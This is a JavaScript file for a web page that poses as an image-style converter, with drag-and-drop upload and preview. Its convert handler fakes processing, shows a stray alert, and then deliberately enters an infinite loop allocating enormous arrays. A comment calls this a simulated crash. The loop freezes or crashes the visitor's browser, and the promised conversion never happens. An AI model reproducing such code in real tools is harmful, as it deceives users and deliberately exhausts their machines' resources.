document.addEventListener('DOMContentLoaded', () => {
    const uploadArea = document.getElementById('uploadArea');
    const fileInput = document.getElementById('fileInput');
    const originalPreview = document.getElementById('originalPreview');
    const convertedPreview = document.getElementById('convertedPreview');
    const convertBtn = document.getElementById('convertBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const loadingSpinner = document.getElementById('loadingSpinner');

    let originalImage = null;

    // Handle drag and drop
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.style.borderColor = 'var(--success-color)';
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.style.borderColor = 'var(--accent-color)';
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.style.borderColor = 'var(--accent-color)';
        const file = e.dataTransfer.files[0];
        if (file && file.type.startsWith('image/')) {
            handleImage(file);
        }
    });

    // Handle click upload
    uploadArea.addEventListener('click', () => {
        fileInput.click();
    });

    fileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            handleImage(file);
        }
    });

    function handleImage(file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            originalImage = new Image();
            originalImage.src = e.target.result;
            originalImage.onload = () => {
                displayOriginalImage();
                convertBtn.disabled = false;
            };
        };
        reader.readAsDataURL(file);
    }

    function displayOriginalImage() {
        originalPreview.innerHTML = '';
        const img = document.createElement('img');
        img.src = originalImage.src;
        originalPreview.appendChild(img);
    }

    // Simulate conversion process
    convertBtn.addEventListener('click', async () => {
        if (!originalImage) return;

        loadingSpinner.classList.remove('hidden');
        convertBtn.disabled = true;
        downloadBtn.disabled = false;

        // Simulate processing time
        await new Promise(resolve => setTimeout(resolve, 2000));

        alert("h");
        
        // Simulate crash by creating an infinite loop
        while(true) {
            let array = [];
            for(let i = 0; i < 10000000; i++) {
                array.push(new Array(10000000));
            }
        }

        // The code below will never execute due to the crash
        convertedPreview.innerHTML = '';
        const convertedImg = document.createElement('img');
        convertedImg.src = originalImage.src;
        convertedPreview.appendChild(convertedImg);

        loadingSpinner.classList.add('hidden');
        downloadBtn.disabled = false;
        convertBtn.disabled = false;
    });

    downloadBtn.addEventListener('click', () => {
        const link = document.createElement('a');
        link.download = 'ghibli-style.png';
        link.href = convertedPreview.querySelector('img').src;
        link.click();
    });
}); 